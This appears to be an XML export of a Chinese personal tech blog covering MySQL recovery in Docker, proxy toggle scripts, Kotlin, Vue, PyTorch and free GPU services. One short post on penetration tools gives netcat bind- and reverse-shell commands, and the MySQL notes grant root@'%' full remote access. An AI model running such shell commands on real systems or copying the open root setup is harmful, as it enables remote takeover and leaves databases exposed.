docker rm -f 102 # 删除容器# 重新启动,并且不适用安全模式 docker run -p 3306:3306 --name 102 \    -v /root/back/102/mysql-files:/var/lib/mysql-files \    -v /root/back/102/conf:/etc/mysql \    -v /root/back/102/logs:/var/log/mysql \    -v /root/back/102/data:/var/lib/mysql \    -e MYSQL_ROOT_PASSWORD=yourpassword \    -d mysql:8.0.19 # 进入docker容器docker exec -it 102 bash# 进入mysqlmysql -u root # 可能需要的步骤(有时候,如果被提示root用户没有权限就执行这个命令)# grant system_user on *.* to &#x27;root&#x27;@&#x27;localhost&#x27;;# 添加root@%用户CREATE USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;&#x27;;# 为root设置允许所有权限GRANT ALL ON *.* TO &#x27;root&#x27;@&#x27;%&#x27;;# 设置加密方式ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;yourpassword&#x27;;ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;yourpassword&#x27;;# 刷新权限flush privileges;

至此我们就完成了数据库的恢复工作.如果是在云服务器,我们就需要放开3306端口,本地就直接连接即可.这样子我们就可以通过navicat等工具连接到数据库了.
补充在经过长达3-4个月的实际使用中。经常会经历包括服务器奔溃，数据库奔溃的情况。曾经我不会解决，每次都要花个10到20分钟。从0开始重新部署一遍数据库。总会显得有些麻烦。现在有一个解决方案：mysql8.0参考文档
在这个文档中，解释到了一些关于强制重启的参数。而这正是我所刚需的。我并不需要对数据库进行写服务，只需要把他设置为readonly模式。这样子，就算服务器因为内存太小奔溃了。它也可以重新自启动。
解决措施：在my.cnf中设置如下参数
[mysqld]innodb_force_recovery = 1

1 （SRV_FORCE_IGNORE_CORRUPT）
即使检测到损坏的页面， 也让服务器运行 。尝试 跳过损坏的索引记录和页面，这有助于转储表。 SELECT * FROM tbl_name
2 （SRV_FORCE_NO_BACKGROUND）
阻止主线程和任何清除线程运行。如果在清除操作期间发生意外退出，此恢复值将阻止它。
3 （SRV_FORCE_NO_TRX_UNDO）
崩溃恢复后 不运行事务 回滚。
4 （SRV_FORCE_NO_IBUF_MERGE）
防止插入缓冲区合并操作。如果这些操作会导致崩溃，则不执行这些操作。不计算表统计 信息。此值可能会永久损坏数据文件。使用此值后，请准备删除并重新创建所有二级索引。设置 InnoDB为只读。
5 （SRV_FORCE_NO_UNDO_LOG_SCAN）
启动数据库时 不查看撤消日志InnoDB：即使未完成的事务也视为已提交。此值可能会永久损坏数据文件。设置InnoDB为只读。
6 （SRV_FORCE_NO_LOG_REDO）
不执行与恢复相关的重做日志 前滚。此值可能会永久损坏数据文件。使数据库页面处于过时状态，这反过来可能会导致 B 树和其他数据库结构进一步损坏。设置 InnoDB为只读。
一般设置为4以上时，就可以解决我的需要了。以上
]]></content>
      <tags>
        <tag>mysql</tag>
        <tag>备份恢复</tag>
      </tags>
  </entry>
  <entry>
    <title>快速便捷开关代理模式</title>
    <url>/posts/9f2a8376/</url>
    <content><![CDATA[如何快速开启和关闭代理模式这一步的前提是你已经完成了clash的部署内容上一篇文章当完成了clash的部署后，自然是需要打开代理的简单的方法就是
export https_proxy=http://127.0.0.1:7890           export http_proxy=http://127.0.0.1:7890   export all_proxy=socks5://127.0.0.1:7891
但是这只是临时使用。如果每次开关代理都这般麻烦，倒不如不用也可以直接将这个部署到/etc/profile或者/root/.bashrc中。但他是永久性的改变。于是有些情况，他并不适用。国内的网站访问时，如果打开代理会使访问速度大大降低。得不偿失。
所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。
第一种简洁方式（但是并不太符合所期望的简洁模式） 设计两个sh脚本分别为open.sh和close.sh 先在目录下建一个目录switchmkdir switch &amp;&amp; cd switch
然后编写两个文件，并把以下内容填入open.sh#!/bin/bashexport http_proxy=http://127.0.0.1:7890export https_proxy=http://127.0.0.1:7890export all_proxy=socket5://127.0.0.1:7891echo &quot;已经打开代理&quot;
close.sh#!/bin/bashunset http_proxyunset https_proxyunset all_proxyecho &quot;已经关闭代理&quot;
他们的作用分别使打开代理和关闭代理。

普及一个知识点source和bash他们都可以执行shell脚本，但是bash命令会新建一个sh窗口，然后执行sh命令，而在新命令行中即便使用了export暴露了全局变量，也只是在新命令行以及新命令行建立的子命令行中有效。当他执行完毕后，他就会销毁构建的命令行，回到你的shell连接界面。此时你刚刚export暴露的全局变量都没了。而如果使用source去执行sh命令。他不会构建一个新命令行，而是在当前的命令行下直接执行，所以你export的全局变量就算正确完成了。
Getsource命令等同于.命令bash命令也可以简化为.&#x2F;命令即
source open.sh//等价于. open.sh////./open.sh//等价于bash open.sh
然后可以将这两个命令软链接到&#x2F;usr&#x2F;bin来达到快捷启动的方法在/usr/bin下执行以下命令
ln -s /root/switch/open.sh openProxyln -s /root/switch/close.sh closeProxy
如上，便可以简单的执行启动和关闭代理的命令
root@VM-16-15-ubuntu:~/switch# . openProxy已经打开代理root@VM-16-15-ubuntu:~/switch# . closeProxy已经关闭代理
以上就是第一种方法。2. 可以在.bashrc中定义方法，在这其中的方法，也是可以直接访问的，而且他执行完后，他export的内容就会变成全局变量。只需要在.bashrc中加入以下内容即可。具体如下
# Open proxyon() &#123;    export https_proxy=http://127.0.0.1:7890    export http_proxy=http://127.0.0.1:7890    export all_proxy=socks5://127.0.0.1:7891    echo &quot;代理已经打开&quot;&#125;# Close proxyoff() &#123;    unset http_proxy    unset https_proxy    unset all_proxy    echo &quot;代理已经关闭&quot;&#125;
然后就可以通过
onoff
来启动和关闭代理了
]]></content>
      <categories>
        <category>clash</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>数据类型、位操作、字符、数组、字符串</title>
    <url>/posts/2cfb3701/</url>
    <content><![CDATA[数据类型类型     -&gt;  位宽度Double  -&gt;  64Float     -&gt;  32Long     -&gt;  64Int        -&gt;  32Short    -&gt;    16Byte    -&gt;    8
kotlin不支持8进制有10进制：2进制：0b开头16进制：0x开头且他的数据类型不会自动由精度低的向高精度的自动转型。必须严格限制类型。
位操作符对于Int和Long类型，还有一系列的位操作符可以使用，分别是：
shl(bits) – 左移位 (Java’s &lt;&lt;)shr(bits) – 右移位 (Java’s &gt;&gt;)ushr(bits) – 无符号右移位 (Java’s &gt;&gt;&gt;)and(bits) – 与or(bits) – 或xor(bits) – 异或inv() – 反向
字符kotlin中的字符不能直接和数字比较，也就是不能直接转化为ASCII码。除非显式转化为Int类型  
&#x27;c&#x27;.toInt()//已废除&#x27;c&#x27;.code//表示&#x27;c&#x27;的ASCII码
数组数组用类 Array 实现，并且还有一个 size 属性及 get 和 set 方法，由于使用 [] 重载了 get 和 set 方法，所以我们可以通过下标很方便的获取或者设置数组对应位置的值。
数组的创建两种方式：一种是使用函数arrayOf()；另外一种是使用工厂函数。如下所示，我们分别是两种方式创建了两个数组：
fun main(args: Array&lt;String&gt;) &#123;    //[1,2,3]    val a = arrayOf(1, 2, 3)    //[0,2,4]    val b = Array(3, &#123; i -&gt; (i * 2) &#125;)    //读取数组内容    println(a[0])    // 输出结果：1    println(b[1])    // 输出结果：2&#125;
若要读取一整个数组需要使用数组的一个方法.contentToString()才可以让数组不显示hash值。正确显示。
字符串一个去除前置空格的方法trimMargin()字符串可以调用该方法去除掉前置空格。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>服务器测速</title>
    <url>/posts/3948588c/</url>
    <content><![CDATA[
SSH连接登录云服务器

执行命令：
 wget https://raw.github.com/sivel/speedtest-cli/master/speedtest.pypython speedtest.py --share

然后就会有所需要的测速图片地址了


]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>speedtest</tag>
      </tags>
  </entry>
  <entry>
    <title>本地存储带动态路径</title>
    <url>/posts/3c0d3cf9/</url>
    <content><![CDATA[
官方文档主要使用local的本地存储，可以使用动态存储路径。例如assets/&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;timestamp&#125;_&#123;filename&#125;会转变为./assets/2020/01/01/1577808000_your-file-name.jpg

]]></content>
  </entry>
  <entry>
    <title>数据通信基础：传输数据的信息系统</title>
    <url>/posts/870f1c14/</url>
    <content><![CDATA[数据通信基础基本概念
消息
信息 （有用的消息）
数据
信号 信息的物理表现 主要为电信号

定义（依照通信协议 ，利用数据传输技术在两个功能单元之间传递数据信息，它可实现计算机与计算机、计算机与终端或终端与终端之间的数据信息传递） 
数据信号基本传输方式  基带传输（直接传输数字信号），频带传输（信道上实际传输的是模拟信号）和数字传输（PCM信道）。
  模拟信号：频带传输。 数字信号：基带传输和数字传输
传输代码   国际五号码，IA5，ASCII码

语音的数据编码A&#x2F;D转化要经过:采样、量化、编码。采样速度: fs&gt;2fm （采样定理）。fm为语音信号的最高频率，一般为4 kHz.采用A律特性的PCM调制，每个量化值用8位二进制数表示，因此一路数字话音速率为64 kbps.条形码条形码是在商店里几乎在每件商品上都可以看到的那些万能的黑白条状粘贴物。条形码是一系列由白色间隔分隔的&gt; &gt; 黑条。黑条的宽度以及它们的反光能力代表二进制的“1”和“0”，用来识别商品的价格或物品。

数据通信系统![image](./o/r/15/2a9f95b6-c306-45a2-96e7-1422c5fe3d25/1681712430_image.png)
  模拟通信系统，利用模拟信号传输，需要经过模拟信号和原始电信号(基带信号)的转变，基带信号和频带信号
数字通信模型
![image](./o/r/18/b31623f5-daff-4c77-8d87-def1c155fd42/1681713207_image.png)


信源编码与译码目的：提高信息传输的有效性;完成模&#x2F;数转换。
信道编码与译码目的：增强抗干扰能力。
加密与解密目的：保证所传信息的安全。
数字调制与解调目的：形成适合在信道中传输的带通信号。 
同步目的：使收发两端的信号在时间上保持步调一致。

数据终端设备（DTE）将信息变化为数据：数据输入设备，数据输出设备，传输控制器。传输控制器控制数据的传输过程数据电路：数据电路端接设备（DCE）和 传输路线 ！并不是说，数据通信一定是数字信号，也可以有模拟信号的传输。基带传输时，DCE对DTE的数据信号进行变换，使信号功率谱与信道相适应，使得数据信号适合在电缆信道中传输。频带信号传输时，DCE具体是调制解调器，实现用基带信号调制载波信号，实现频带搬移。 数据信号在数字信道上传输时，即数字数据传输，DCE是数据服务单元，即信号格式变换，消除信号中的直流成分和防止长串1或长串0编码，信号再生和定时等。数据电路加上数据传输控制功能、通信控制功能后就构成了数据链路。控制装置是按照双方事先约定的规程进行控制的。

中央计算机系统(CCS)组成：由通信控制器、主机及其外围设备组成；功能：处理从DTE输入的数据信息，并将处理结果向相应的DTE输出。通信控制器：是数据电路和计算机系统的接口。通信控制器又称为前置处理机，用于管理与数据终端相连接的所有通信线路；完成信号的串并转换。（对DTE来说其功能是差错控制和传输过程控制等）。主机：又称为中央处理机，由中央处理单元（CPU）、主存储器、输入&#x2F;输出设备及其他外围设备组成。其功能主要是进行数据处理。
传输信道狭义：传输介质广义：传输介质和各种信号之间的转化。分类：
1. 

有线信道
无线信道（电磁波）





数字信道
模拟信道



3. 

专用信道
公用信道介质特性：物理特性，传输特性，干扰特性。卫星通信（270ms时延）



传输损耗衰减(信噪比低)，延迟(产生信号畸变)，噪声(破坏信号，产生误码，0.01s560比特)

光纤损耗最小点在1.31和1.55m


衰减  传输的过程中转化为热能，导致信号强度不断减弱。D&#x3D;10lgP0&#x2F;P1（信噪比）介质的输入功率和输出功率之差。
噪声和干扰  分子热运动，高斯白噪声，无法预测。幅度的概率密度服从高斯分布；功率谱密度(单位W&#x2F;Hz)N0在整个频率域内均匀分布。噪声功率&#x3D;带宽*功率谱密度 PN &#x3D; BN0信号功率与噪声功率之比:

]]></content>
      <tags>
        <tag>数据通信</tag>
      </tags>
  </entry>
  <entry>
    <title>海外节点更新域名配置耗时</title>
    <url>/posts/9faca216/</url>
    <content><![CDATA[域名未备案，只能使用海外节点，所以每次更新域名配置时，都要花费很长的时间才能完成。 
]]></content>
  </entry>
  <entry>
    <title>浏览器解析JSON数据受响应头影响</title>
    <url>/posts/4b71b454/</url>
    <content><![CDATA[已知，很多浏览器会默认去解析从api获取到的json格式的数据。但是却无法解析成功。这是因为浏览器解析这个数据是需要判断返回值的headers的。例如：当我向后端发送请求时，如果response的header为Content-Type:text&#x2F;plain。那么该浏览器便不会对他进行解析，而是默认为字符串。此时后端程序为
get(&quot;/api/sentence&quot;)&#123;//            call.response.headers.append(&quot;Content-Type&quot;, &quot;application/json&quot;)            val number = (0..1000).random()            call.respond(JSONUtil.toJsonStr(readText?.get(number)))        &#125;
前端查看到的数据为此时的响应头为此时如果需要浏览器可以解析数据。只需要将上述代码的//去除，然后他返回的标头便会变为application&#x2F;json。然后即可解析为下图响应头为
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器路由导航：Push vs Replace</title>
    <url>/posts/f2612c99/</url>
    <content><![CDATA[路由2浏览器历史记录有两种方式push：不会删去刚刚的页面，而是添加新的页面记录，像压栈一样去记录replace：直接替换掉刚刚的页面记录。浏览器默认为push操作再router-link中添加一个属性:replace=&quot;true&quot;他会将改点击事件记录为replace操作
编程式路由导航即不通过router-link即不适用a标签。而是通过写方法于button绑定之类的方法。关键方法：this.$router.push(&#123;&#125;)这里通过实现router的push方法跳转页面，也可以使用replace方法进行跳转。同样的push中的对象就是to的对象时写法。有name，path，params，query参数。
两种方法。$router.back()后退页面，￥router.forword()页面前进
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>消息订阅发布和Vue.set使用</title>
    <url>/posts/99055447/</url>
    <content><![CDATA[pubsub实现消息订阅于发布先安装pubsub
npm i pubsub-js
可以实现消息订阅与发布，他的操作主要有subscribe订阅，unsubscribe取消订阅，publish发布消息。每次取消订阅需要获取订阅的id再用案例订阅。
//学校&lt;script&gt;import pubsub from &#x27;pubsub-js&#x27;;	export default(&#123;		name:&#x27;school&#x27;,		data()&#123;			return&#123;				schoolName:&#x27;湖科大&#x27;,				addr:&#x27;湖南&#x27;			&#125;		&#125;,		mounted()&#123;		const pubid = 	pubsub.subscribe(&#x27;hello&#x27;,function(messageName,data)&#123;				console.log(&#x27;成功订阅消息&#x27;,messageName,data)			&#125;)		&#125;,		beforeDestroy()&#123;			pubsub.unsubscribe(pubid)		&#125;	&#125;)&lt;/script&gt;//学生&lt;script&gt;import pubsub from &#x27;pubsub-js&#x27;;    export default  &#123;        name:&#x27;Student&#x27;,        data()&#123;            return&#123;                name:&#x27;hzt&#x27;,                sex:&#x27;男&#x27;            &#125;        &#125;,        mounted()&#123;        &#125;,        methods:&#123;            sendStudentName()&#123;                pubsub.publish(&#x27;hello&#x27;,666)            &#125;        &#125;    &#125;&lt;/script&gt;
Vue.set的使用例如
handleEdit(todo)&#123;  this.$set(todo,&#x27;isEdit&#x27;,true)&#125;
他的作用是给todo数组添加一个属性isEdit且值为true，这个属性会接受数据代理，能够被vue所检测到。
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习速成get知识点</title>
    <url>/posts/a702fcb0/</url>
    <content><![CDATA[
dir()它可以展示一个package中所有的方法和类，以列的方式展示出来。

help()它可以具体展示某个方法或者类的使用说明，也可以使用方法??后面接两个问号的方式，实现提示功能

jupyter，python console，python文件的区别和使用python文件：他会将所有内容都重新编译运行，比较耗时，适合完整的大型项目jupyter，python console：都可以将每一个python语句拆分成任意块去单独执行。执行速度快。不会重复运行但是python console如果出了错误。会很影响阅读体验。因此常用来做测试而jupyter有着文字和代码共存的特性适合用来做笔记和学习

TensorBoard的使用他可以将数据转化成图表类型，更加的可观，明了。例1：
from torch.utils.tensorboard import SummaryWriter# from read_image import img_arraywriter = SummaryWriter(&quot;logs&quot;) # 他会生成这个文件夹，并在close后写入数据# print(type(img_array))# print(img_array.shape)# writer.add_image(&quot;test&quot;,img_array,1,dataformats=&#x27;HWC&#x27;)# y = xfor i in range(100):    writer.add_scalar(&quot;y=2x&quot;,2*i,i)writer.close()
然后在cmd窗口打开tensorboard，使用该命令tensorboard --logdir=logs --port=6006，他默认端口为6006同样的，可以添加图片，即将上述代码的注释去除。并带上这些读取图片的代码：
from PIL import Imageimport numpy as npimage_path = &quot;data/train/ants-image/0013035.jpg&quot;img = Image.open(image_path)img_array = np.array(img)
因为tensorboard读取图片只能使用固定的两种格式的数据，因此我们采用numpy格式的图片读入

transforms他的本质就是一个强大的工具类，我们通过具体化这些工具类，并生成自己需要的工具，然后使用
# tenser数据类型：通过transforms.ToTenser去实现# tenser数据类型：就是一个包装了反向神经网络所需要的参数的数据类型img_path = &quot;data/train/ants-image/0013035.jpg&quot;img = Image.open(img_path)# print(img)tensor_trains = transforms.ToTensor()tensor_img = tensor_trains(img)print(tensor_img)

常用的transforms
from PIL import Imagefrom torchvision import transformsfrom torch.utils.tensorboard import SummaryWriterwriter = SummaryWriter(&quot;logs&quot;)img = Image.open(&quot;images/15.jpg&quot;)print(img)# ToTensor的使用trans_totensor = transforms.ToTensor()img_tensor = trans_totensor(img)writer.add_image(&quot;ToTensor&quot;, img_tensor)# Normalizeprint(img_tensor[0][0][0])trans_morm = transforms.Normalize([0.2, 1.3, 2.1], [3, 2, 1])img_norm = trans_morm(img_tensor)print(img_norm[0][0][0])writer.add_image(&quot;Normalize&quot;, img_norm, 7)# Resizeprint(img.size)trans_resize = transforms.Resize((512, 512))# img PIL -&gt; resize -&gt; img_resize PILimg_resize = trans_resize(img)# img_resize PIL -&gt; totensor -&gt; img_resize tensorimg_resize = trans_totensor(img_resize)writer.add_image(&quot;Resize&quot;, img_resize, 0)# Compose -resize -2trans_resize_2 = transforms.Resize(512)trans_compose = transforms.Compose([trans_resize_2, trans_totensor])img_resize_2 = trans_compose(img)writer.add_image(&quot;Resize&quot;, img_resize_2, 1)# RandomCroptrans_random = transforms.RandomCrop((512, 800))trans_compose_2 = transforms.Compose([trans_random, trans_totensor])for i in range(10):    img_crop = trans_compose_2(img)    writer.add_image(&quot;RandomCropHW&quot;, img_crop, i)writer.close()


dataset的使用例子from torch.utils.data import Datasetfrom PIL import Imageimport osclass MyData(Dataset):    def __init__(self,root_dir,label_dir):        self.root_dir = root_dir        self.label_dir = label_dir        self.path = os.path.join(root_dir,label_dir)        self.img_path = os.listdir(self.path)    def __getitem__(self, index):        img_name = self.img_path[index]        img_item_path = os.path.join(self.path,img_name)        img = Image.open(img_item_path)        label = self.label_dir        return img,label    def __len__(self):        return len(self.img_path)root_dir = &quot;dataset/train&quot;ants_label_dir = &quot;ants&quot;bees_label_dir = &quot;bees&quot;ants_dataset = MyData(root_dir,ants_label_dir)bees_dataset = MyData(root_dir,bees_label_dir)train_dataset = ants_dataset+bees_dataset

dataset 和 dataloaderdataset就是一个数据集。而dataloader是用来从dataset中取数据的一个工具
模型的保存和读取保存
读取
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习再入门</title>
    <url>/posts/505d5ee7/</url>
    <content><![CDATA[什么是深度学习深度学习是一种人工智能（AI）方法，用于教计算机以受人脑启发的方式处理数据。深度学习模型可以识别图片、文本、声音和其他数据中的复杂模式，从而生成准确的见解和预测。
深度学习的广义作用计算机视觉计算机视觉是指计算机从图像和视频中提取信息及见解的能力。计算机可以使用深度学习技术来理解图像，就像人类一样。计算机视觉具有多种应用，如下所示：

内容审核，用于从图像和视频归档中自动删除不安全或不适当的内容
面部识别，用于识别面部和多项属性，如睁开的眼睛、眼镜以及面部毛发
图像分类，用于识别品牌徽标、服装、安全装备和其他图像细节

语音识别深度学习模型可以分析人类语音，尽管说话模式、音调、语气、语言和口音不尽相同。虚拟助手（如 Amazon Alexa）和自动转录软件使用语音识别执行以下任务：
自然语言处理计算机使用深度学习算法从文本数据和文档中收集见解和意义。这种处理自然的、人工创建的文本的能力有几个使用场景，包括在以下功能中：推荐引擎应用程序可以使用深度学习方法来跟踪用户活动并开发个性化推荐。它们可以分析各种用户的行为，并帮助他们发现新产品或服务。例如，许多媒体和娱乐公司，例如 Netflix、Fox 和 Peacock，都使用深度学习来提供个性化的视频推荐。
深度学习的工作原理深度学习算法是仿照人脑建模的神经网络。例如，人脑包含数百万个相互关联的神经元，它们协同工作以学习和处理信息。同样，深度学习神经网络（或人工神经网络）是由在计算机内部协同工作的多层人工神经元组成的。人工神经元是称为节点的软件模块，它使用数学计算来处理数据。人工神经网络是使用这些节点来解决复杂问题的深度学习算法。
深度学习的组成部分输入层人工神经网络有几个向其输入数据的节点。这些节点构成了系统的输入层。
隐藏层输入层处理数据并将其传递到神经网络中更远的层。这些隐藏层在不同层级处理信息，在接收新信息时调整其行为。深度学习网络有数百个隐藏层，可用于从多个不同角度分析问题。
例如，如果您得到了一张必须分类的未知动物的图像，则可以将其与您已经认识的动物进行比较。例如，您可以查看其眼睛和耳朵的形状、大小、腿的数量和毛皮花色。您可以尝试识别图样，如下所示：

动物有蹄，所以它可能是牛或鹿。
动物有猫眼，所以它可能是某种类型的野猫。

深度神经网络中的隐藏层以相同的方式工作。如果深度学习算法试图对动物图像进行分类，则其每个隐藏层都会处理动物的不同特征并尝试对其进行准确的分类。
输出层输出层由输出数据的节点组成。输出 “是” 或 “否” 答案的深度学习模型在输出层中只有两个节点。那些输出更广泛答案的模型则有更多的节点。 
]]></content>
  </entry>
  <entry>
    <title>白嫖GPU来跑机器学习</title>
    <url>/posts/37284e3f/</url>
    <content><![CDATA[google colab地址使用google的服务的话，需要有一些科学工具来帮忙，这些我默认你们都知道了在这里第一个选项可以启动服务，第二个选项可以修改GPU的类型，因为是免费的，所以只有很少的选项：
他用来跑服务的话，俺记得是一次不能超过6个小时，你需要访问数据集的话，可以通过Google 硬盘来加载。
kaggle地址这也是一个国外的白嫖gpu的平台，他的限额是每周30个小时，对于初学者而言已经绰绰有余了。而且他支持离线运行，即便你因为网络不稳定而掉线。他也会稳定在后台跑完，并完成数据的输出。这里是它可以白嫖使用的一些GPU。
天池notebook地址他的优点就是国内平台，可以很快捷的访问。他提供每个月60个小时的额度，如果不够用你再考虑使用kaggle等其他的。
以上
]]></content>
      <categories>
        <category>白嫖</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>百度网盘极速下载：IDM+油猴插件</title>
    <url>/posts/d6483f91/</url>
    <content><![CDATA[百度网盘快速下载方法：首先，该方法的前提条件是IDM和网页版百度网盘

你需要下载油猴，并在油猴中添加一个插件百度网盘千千下载助手，这里是快速下载链接
但我要差一嘴，其实这个插件最初是软件小妹进行运维的，后来百度严查，软件小妹就没再运维了。不知道为何被千千下载助手获取。但这并不影响我们白嫖这个好用的插件。


进入百度网盘网页版界面，打开油猴，他会有一系列提示。下载器有IDM和Aria2两种，推荐IDM。后续方法可以直接看网页的提示了。这里不再多言。

]]></content>
      <tags>
        <tag>黑科技</tag>
      </tags>
  </entry>
  <entry>
    <title>神经网络和深度学习</title>
    <url>/posts/2875a41b/</url>
    <content><![CDATA[什么是神经网络？我们常常用深度学习这个术语来指训练神经网络的过程。神经网络就是一个通过深度学习构建出来的大规模函数。可以通过任意x得到一个想要的结果yReLU激活函数：全称是Rectified Linear Unit。可以理解成max(0,x)，这也是你得到一个这种形状的函数的原因。
神经网络的监督学习对于一个神经网络的训练过程，人为的设定某些需要的参数和结果。用来导向神经网络的发展方向。对于图像应用，我们经常在神经网络上使用卷积（Convolutional Neural Network），通常缩写为CNN对于序列数据，经常使用RNN，一种递归神经网络（Recurrent Neural Network）
从历史经验上看，处理非结构化数据是很难的，与结构化数据比较，让计算机理解非结构化数据很难

神经网络规模和其准确性的关系图

神经网络方面的一个巨大突破是从sigmoid函数转换到一个ReLU函数
通过不断修改算法，代码中的细节。来不断提搞构建高效的神经网络。
神经网络的编程基础二分类(Binary Classification)神经网络的训练过程可以分为前向传播和反向传播两个独立的部分前向传播就是根据训练集得到代价函数。反向传播再通过最小化代价函数解的之前的参数。
逻辑回归(Logistic Regression)逻辑回归(logistic regression)是一个用于二分类(binary classification)的算法Hypothesis Function（假设函数）：将ReLu函数重新变为sigmoid函数
##逻辑回归的代价函数（Logistic Regression Cost Function）训练参数w和参数b，你需要定义一个代价函数
逻辑回归的输出函数:
损失函数又叫做误差函数，用来衡量算法的运行情况，Loss function一般我们用预测值和实际值的平方差或者它们平方差的一半，但是通常在逻辑回归中我们不这么做，因为当我们在学习逻辑回归参数的时候，会发现我们的优化目标不是凸优化，只能找到多个局部最优值，梯度下降法很可能找不到全局最优值，虽然平方差是一个不错的损失函数，但是我们在逻辑回归模型中会定义另外一个损失函数。
逻辑回归可以看做是一个非常小的神经网络
梯度下降法（Gradient Descent）在你测试集上，通过最小化代价函数（成本函数）J(w,b)来训练的参数w和参数b，

由于逻辑回归函数的代价函数，J(w,b)的特性，我们必须定义其为凸函数。也就是形如此如果是非凸，则有多个局部最小值，无法得出结果梯度下降通过不断迭代参数w，b来找到最小的成本函数J(w,b)
使用计算图求导数（Derivatives with a Computation Graph）正向或者说从左到右的计算来计算成本函数J，你可能需要优化的函数，然后反向从右到左计算导数
逻辑回归中的梯度下降（Logistic Regression Gradient Descent）通过计算偏导数来实现逻辑回归的梯度下降算法
1.
一个示例代码流程：
J=0;dw1=0;dw2=0;db=0;for i = 1 to m    z(i) = wx(i)+b;    a(i) = sigmoid(z(i));    J += -[y(i)log(a(i))+(1-y(i)）log(1-a(i));    dz(i) = a(i)-y(i);    dw1 += x1(i)dz(i);    dw2 += x2(i)dz(i);    db += dz(i);J/= m;dw1/= m;dw2/= m;db/= m;w=w-alpha*dwb=b-alpha*db
当你应用深度学习算法，你会发现在代码中显式地使用for循环使你的算法很低效，同时在深度学习领域会有越来越大的数据集。所以能够应用你的算法且没有显式的for循环会是重要的，并且会帮助你适用于更大的数据集。所以这里有一些叫做向量化技术,它可以允许你的代码摆脱这些显式的for循环。
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>知乎：科学普及对科学发展的必要性</title>
    <url>/posts/735b0735/</url>
    <content><![CDATA[
引用自https://zhuanlan.zhihu.com/p/53260098

]]></content>
      <tags>
        <tag>k8s</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>系统环境变量与用户环境变量的配置区别</title>
    <url>/posts/a2be5f61/</url>
    <content><![CDATA[
作用域：&#x2F;etc&#x2F;profile的作用域是全局的，涉及系统级的环境变量和启动程序而~&#x2F;.bashrc往往是在用户目录下，只对登录的用户有效。
profile只在登录时执行一遍，之后添加内容的话，需要source刷新才能访问到添加的内容。而.bashrc更新完后，执行一次脚本就会更新。#linux

]]></content>
  </entry>
  <entry>
    <title>组件自定义事件：提高模块化，增强父子通信</title>
    <url>/posts/3bb575f6/</url>
    <content><![CDATA[组件的自定义事件
父子之间传值来引入问题。在以往的方法中，要从父往子传值，可以使用props，直接传值。从子向父传值，需要将父的方法通过props传递给子，然后子接收后调用方法。然后完成传值。但是这样子操作耦合性太强，不好分离模块化。因此引入一个新的写法。组件自定义事件。写法：


v-on方法。直接在子组件的标签上绑定上自定义事件，并于自己的方法绑定。例：&lt;Student v-on:action=&quot;getStudentName&quot;/&gt;其中action是我们自定义的事件名，他会和 Student相关联。然后被绑定到父组件的getStudnetName方法上。注意：他会将action自定义事件绑定再vc标签所对应的vc实例上。其次，再在Student组件中，你需要定义一个方法，绑定一个按钮或者什么事件来触发方法，用这个方法来触发你所自定义的事件,然后与父组件的方法联动使用。&lt;button @click = &quot;getName&quot;&gt;点我&lt;/button&gt;....methods:&#123;  getName()&#123;    this.$emit(&#x27;action&#x27;)//你所绑定的自定义事件action    this.$emit(&#x27;badspider&#x27;,this.name,2,3,4,1,4,2)  &#125;&#125;

扩展
我们目前所使用的都是直接绑定v-on:action，就是直接绑定了事件，倘若我们不需要直接绑定自定义事件，或者延时绑定的话，可以在父组件中写一个钩子，通过ref直接获取子组件再来进行绑定。
ref属性，可以直接获取子组件的实例对象


&lt;Student ref=&quot;student&quot;&gt;//通过this.$refs.student获取该实例对象
绑定
mountd()&#123;  this.$refs.student.$on(&#x27;action&#x27;,this.getStudentName)//获取该实例对象，然后绑定自定义事件和方法&#125;//也可以不写方法来绑定，而是直接绑定一个方法mountd()&#123;  this.$refs.student.$on(&#x27;action&#x27;,()=&gt;&#123;this.Item = ...&#125;)//注意，用$on绑定后，默认会传递回他本来的`this`即`Student`，所以这里使用括号函数，让`this`指向`App`.&#125;//若是只想绑定后只触发一次，可以有一下两种操作@action.once或者this.$refs.student.$once()这两种都可以只触发一次
所有在组件标签上的事件都会被vue认为时自定义事件，为了可以定义js原生的事件例如click,可以加入.native例如&lt;Student @click.native=&quot;getStudentName&quot;&gt;&lt;/Student&gt;
解除绑定使用$off()生命周期this.$destroy()他的销毁过程不会破坏他本身的dom节点，即你给一个点击事件绑定了一个方法，他依然会有点击事件发生，但他所绑定的自定义事件都不会发生了,他绑定的方法任然存在
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>网络渗透工具</title>
    <url>/posts/cc7117f6/</url>
    <content><![CDATA[棱角社区这里面有很多方便快捷的工具和命令，帮助我们完成包括文件上传和反弹shell的操作。棱角社区
ncat命令使用他的主要作用是反弹shell。那么就会有两种方式：
正向反弹# 被控制端nc -lvp &lt;PORT&gt; -e /bin/bash# 控制端nc &lt;IP&gt; &lt;PORT&gt;

反向反弹# 被控制端nc -e /bin/bash &lt;IP&gt; &lt;PORT&gt;# 控制端nc -lvp &lt;PORT&gt;

不可否认的就是一定是被控制端将bash的权限交出来。但是正向和反向取决于是我们监听还是被监听。
]]></content>
      <tags>
        <tag>网络渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>自部署gitea</title>
